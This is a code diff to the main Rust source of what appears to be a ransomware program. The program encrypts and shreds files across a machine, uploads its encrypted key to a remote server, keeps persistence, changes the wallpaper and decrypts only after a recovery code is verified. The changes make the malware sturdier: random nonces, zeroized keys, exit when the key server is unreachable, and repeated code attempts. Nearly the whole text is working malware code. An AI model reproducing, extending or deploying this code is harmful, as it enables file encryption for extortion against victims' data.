@@ -12,13 +12,10 @@ use hex::encode;
 use log::{debug, error, info, warn};
 use std::{
     path::{Path, PathBuf},
-    sync::{
-        Arc,
-        atomic::{AtomicU64, Ordering},
-    },
+    sync::{Arc, Mutex, mpsc},
     thread,
 };
-use zeroize::Zeroize;
+use zeroize::{Zeroize, Zeroizing};
 
 use coconut_crab_lib::{file::get_exe_path_dir, web::codes::RECOVERY_REQUEST_CODE};
 
@@ -27,7 +24,7 @@ use persist::{start_persist, stop_persist};
 
 mod crypto;
 use crypto::{
-    decrypt, encrypt, encrypt_string, encrypt_sym_key, generate_sym_key, nonce_from_counter, record,
+    decrypt, encrypt, encrypt_string, encrypt_sym_key, generate_nonce, generate_sym_key, record,
 };
 
 mod walker;
@@ -97,25 +94,18 @@ fn main() {
     let thread_counts = get_thread_counts();
 
     let mut sym_key = [0u8; 32];
-    let counter = if status.encryption_started {
-        AtomicU64::new(u64::MAX / 2) // Start at very high value on restart to avoid nonce reuse
-    } else {
-        AtomicU64::new(0)
-    };
 
     if !status.encryption_complete {
         setup_encryption_keys(
             &mut status,
             &mut sym_key,
-            &counter,
             &exe_path_dir,
             server_fqdn,
             preshared_secret,
         );
     }
 
-    let sym_key_arc = Arc::new(sym_key);
-    let counter_arc = Arc::new(counter);
+    let sym_key_arc = Arc::new(Zeroizing::new(sym_key));
     let encrypted_extension = config::ENCRYPTED_EXTENSION.to_string();
     let exe_path_dir_arc = Arc::new(exe_path_dir);
     let aad_arc: Arc<[u8]> = Arc::from(status.encryption_aad.as_bytes().to_vec());
@@ -124,7 +114,6 @@ fn main() {
         run_encryption_pipeline(
             &mut status,
             &sym_key_arc,
-            &counter_arc,
             &exe_path_dir_arc,
             &thread_counts,
             server_fqdn,
@@ -132,9 +121,6 @@ fn main() {
             &aad_arc,
         );
     }
-
-    sym_key.zeroize();
-    debug!("Cleared symmetric key from memory");
 
     if config::SET_WALLPAPER {
         set_icon_wallpaper();
@@ -164,9 +150,11 @@ fn main() {
         ui.set_status_text("Verifying code...".into());
         ui.set_status_progress(true);
 
-        s_decrypt
-            .send(Arc::new(code))
-            .expect("Failed to send code to decryption handler thread");
+        if let Err(error) = s_decrypt.send(Arc::new(code)) {
+            error!("Failed to send code to decryption handler thread: {error}");
+            ui.set_status_text("Decryption unavailable".into());
+            ui.set_status_progress(false);
+        }
     });
 
     ui.run().expect("Failed to run Slint UI");
@@ -175,7 +163,6 @@ fn main() {
 fn setup_encryption_keys(
     status: &mut Status,
     sym_key: &mut [u8; 32],
-    counter: &AtomicU64,
     exe_path_dir: &Path,
     server_fqdn: &str,
     preshared_secret: &str,
@@ -187,7 +174,7 @@ fn setup_encryption_keys(
         debug!("Encryption previously started");
 
         debug!("Starting key retrieval");
-        *sym_key = if let Some(key) = get_sym_key(
+        let Some(key) = get_sym_key(
             server_fqdn,
             config::SERVER_PORT,
             status,
@@ -195,14 +182,11 @@ fn setup_encryption_keys(
             preshared_secret,
             config::HTTPS,
             config::VERIFY_SERVER,
-        ) {
-            key
-        } else {
-            debug!("Unable to retrieve key. Marking encryption complete.");
-            status.encryption_complete = true;
-            sym_key.zeroize();
-            [0u8; 32]
+        ) else {
+            error!("Unable to retrieve symmetric key from server; exiting");
+            std::process::exit(1);
         };
+        *sym_key = *key;
     } else {
         debug!("Encryption not previously started");
         generate_sym_key(sym_key);
@@ -213,12 +197,8 @@ fn setup_encryption_keys(
             config::HTTPS,
             config::VERIFY_SERVER,
         ) else {
-            error!("Unable to download asymmetric public key; marking encryption complete");
-            status.encryption_complete = true;
-            sym_key.zeroize();
-            *sym_key = [0u8; 32];
-            export_status_csv(exe_path_dir, status);
-            return;
+            error!("Unable to download asymmetric public key from server; exiting");
+            std::process::exit(1);
         };
         debug!("Got asymmetric public key: {asym_pub_key:?}");
 
@@ -255,11 +235,8 @@ fn setup_encryption_keys(
         .expect("Failed to upload symmetric key");
         debug!("Uploaded encrypted symmetric key");
 
-        let nonce = counter.fetch_add(1, Ordering::Relaxed);
-        debug!("Nonce value after increment: {nonce}");
-
-        let full_nonce_bytes = nonce_from_counter(nonce);
-        debug!("Nonce value after padding: {full_nonce_bytes:?}");
+        let full_nonce_bytes = generate_nonce();
+        debug!("Generated random nonce: {full_nonce_bytes:?}");
 
         status.symmetrically_encrypted_id_nonce = encode(full_nonce_bytes);
         let (id_ciphertext, id_tag) = encrypt_string(
@@ -284,8 +261,7 @@ fn setup_encryption_keys(
 
 fn run_encryption_pipeline(
     status: &mut Status,
-    sym_key: &Arc<[u8; 32]>,
-    counter: &Arc<AtomicU64>,
+    sym_key: &Arc<Zeroizing<[u8; 32]>>,
     exe_path_dir: &Arc<PathBuf>,
     thread_counts: &ThreadCounts,
     server_fqdn: &str,
@@ -299,8 +275,8 @@ fn run_encryption_pipeline(
     debug!("Updated status CSV");
 
     let cap = |consumers: usize| -> usize { std::cmp::max(consumers * 2, 64) };
-    let (channel_a_sender, channel_a_receiver) =
-        crossbeam_channel::bounded(cap(thread_counts.encrypt));
+    let (channel_a_sender, channel_a_receiver) = mpsc::sync_channel(cap(thread_counts.encrypt));
+    let channel_a_receiver = Arc::new(Mutex::new(channel_a_receiver));
     let mut thread_handles = Vec::new();
 
     if config::RANDOM_ORDER {
@@ -335,8 +311,8 @@ fn run_encryption_pipeline(
     if config::ANALYZE_PDF || config::ANALYZE_OFFICE_ZIP || config::AVOID_BROKEN_IMAGES {
         debug!("Canary mode enabled");
 
-        let (channel_b_sender, channel_b_receiver) =
-            crossbeam_channel::bounded(cap(thread_counts.encrypt));
+        let (channel_b_sender, channel_b_receiver) = mpsc::sync_channel(cap(thread_counts.encrypt));
+        let channel_b_receiver = Arc::new(Mutex::new(channel_b_receiver));
 
         for _ in 0..thread_counts.canary {
             thread_handles.push(filter_canary(
@@ -357,13 +333,13 @@ fn run_encryption_pipeline(
             drop(channel_b_receiver);
         } else {
             let (channel_c_sender, channel_c_receiver) =
-                crossbeam_channel::bounded(cap(thread_counts.shred));
+                mpsc::sync_channel(cap(thread_counts.shred));
+            let channel_c_receiver = Arc::new(Mutex::new(channel_c_receiver));
             for _ in 0..thread_counts.encrypt {
                 thread_handles.push(encrypt(
                     channel_b_receiver.clone(),
                     channel_c_sender.clone(),
                     Arc::clone(sym_key),
-                    Arc::clone(counter),
                     Arc::clone(aad),
                 ));
             }
@@ -380,14 +356,13 @@ fn run_encryption_pipeline(
         thread_handles.push(record(channel_a_receiver.clone(), Arc::clone(exe_path_dir)));
         drop(channel_a_receiver);
     } else {
-        let (channel_c_sender, channel_c_receiver) =
-            crossbeam_channel::bounded(cap(thread_counts.shred));
+        let (channel_c_sender, channel_c_receiver) = mpsc::sync_channel(cap(thread_counts.shred));
+        let channel_c_receiver = Arc::new(Mutex::new(channel_c_receiver));
         for _ in 0..thread_counts.encrypt {
             thread_handles.push(encrypt(
                 channel_a_receiver.clone(),
                 channel_c_sender.clone(),
                 Arc::clone(sym_key),
-                Arc::clone(counter),
                 Arc::clone(aad),
             ));
         }
@@ -433,9 +408,9 @@ fn spawn_decryption_handler(
     walk_threads: usize,
     decrypt_threads: usize,
     persist: bool,
-) -> crossbeam_channel::Sender<Arc<String>> {
+) -> mpsc::SyncSender<Arc<String>> {
     let ui_handle = ui.as_weak();
-    let (s_decrypt, r_decrypt) = crossbeam_channel::bounded(1);
+    let (s_decrypt, r_decrypt) = mpsc::sync_channel(1);
 
     let status = status.clone();
     let server_fqdn = server_fqdn.to_string();
@@ -445,30 +420,69 @@ fn spawn_decryption_handler(
     thread::spawn(move || {
         debug!("Initializing decryption handler thread");
 
-        let code: Arc<String> = match r_decrypt.recv() {
-            Ok(key) => {
-                debug!("Received code over channel: {key:?}");
-                key
-            }
-            Err(error) => {
-                warn!("Error receiving code over channel: {error}");
-                return;
-            }
-        };
+        let mut persistence_stopped = false;
+        loop {
+            let code: Arc<String> = match r_decrypt.recv() {
+                Ok(key) => {
+                    debug!("Received code over channel: {key:?}");
+                    key
+                }
+                Err(error) => {
+                    warn!("Error receiving code over channel: {error}");
+                    return;
+                }
+            };
 
-        debug!("Requesting symmetric key using user provided code");
-        let Some(sym_key) = get_sym_key(
-            &server_fqdn,
-            config::SERVER_PORT,
-            &status,
-            &code,
-            &preshared_secret,
-            config::HTTPS,
-            config::VERIFY_SERVER,
-        ) else {
+            debug!("Requesting symmetric key using user provided code");
+            let Some(sym_key) = get_sym_key(
+                &server_fqdn,
+                config::SERVER_PORT,
+                &status,
+                &code,
+                &preshared_secret,
+                config::HTTPS,
+                config::VERIFY_SERVER,
+            ) else {
+                if ui_handle
+                    .upgrade_in_event_loop(move |handle| {
+                        handle.set_status_text("Code failed verification".into());
+                    })
+                    .is_err()
+                {
+                    error!("Failed to upgrade UI handle");
+                }
+                if ui_handle
+                    .upgrade_in_event_loop(move |handle| handle.set_status_progress(false))
+                    .is_err()
+                {
+                    error!("Failed to upgrade UI handle");
+                }
+                continue;
+            };
+
+            info!("Starting decryption");
             if ui_handle
                 .upgrade_in_event_loop(move |handle| {
-                    handle.set_status_text("Code failed verification".into());
+                    handle.set_status_text("Code successfully verified. Decrypting...".into());
+                })
+                .is_err()
+            {
+                error!("Failed to upgrade UI handle");
+            }
+
+            let aad: Arc<[u8]> = Arc::from(status.encryption_aad.as_bytes().to_vec());
+            decrypt_files(
+                sym_key,
+                &encrypted_extension,
+                walk_threads,
+                decrypt_threads,
+                &aad,
+            );
+
+            info!("Decryption complete");
+            if ui_handle
+                .upgrade_in_event_loop(move |handle| {
+                    handle.set_status_text("Decryption complete".into());
                 })
                 .is_err()
             {
@@ -480,47 +494,12 @@ fn spawn_decryption_handler(
             {
                 error!("Failed to upgrade UI handle");
             }
-            return;
-        };
 
-        info!("Starting decryption");
-        if ui_handle
-            .upgrade_in_event_loop(move |handle| {
-                handle.set_status_text("Code successfully verified. Decrypting...".into());
-            })
-            .is_err()
-        {
-            error!("Failed to upgrade UI handle");
-        }
-
-        let aad: Arc<[u8]> = Arc::from(status.encryption_aad.as_bytes().to_vec());
-        decrypt_files(
-            sym_key,
-            &encrypted_extension,
-            walk_threads,
-            decrypt_threads,
-            &aad,
-        );
-
-        info!("Decryption complete");
-        if ui_handle
-            .upgrade_in_event_loop(move |handle| {
-                handle.set_status_text("Decryption complete".into());
-            })
-            .is_err()
-        {
-            error!("Failed to upgrade UI handle");
-        }
-        if ui_handle
-            .upgrade_in_event_loop(move |handle| handle.set_status_progress(false))
-            .is_err()
-        {
-            error!("Failed to upgrade UI handle");
-        }
-
-        if persist {
-            debug!("Ending persistence");
-            stop_persist();
+            if persist && !persistence_stopped {
+                persistence_stopped = true;
+                debug!("Ending persistence");
+                stop_persist();
+            }
         }
     });
 
@@ -528,13 +507,14 @@ fn spawn_decryption_handler(
 }
 
 fn decrypt_files(
-    sym_key: [u8; 32],
+    sym_key: Zeroizing<[u8; 32]>,
     encrypted_extension: &str,
     walk_threads: usize,
     decrypt_threads: usize,
     aad: &Arc<[u8]>,
 ) {
-    let (s3, r3) = crossbeam_channel::bounded(std::cmp::max(decrypt_threads * 2, 64));
+    let (s3, r3) = mpsc::sync_channel(std::cmp::max(decrypt_threads * 2, 64));
+    let r3 = Arc::new(Mutex::new(r3));
     let mut thread_handles = Vec::new();
 
     debug!("Spawning walk coordinator for decryption with {walk_threads} zlob workers");
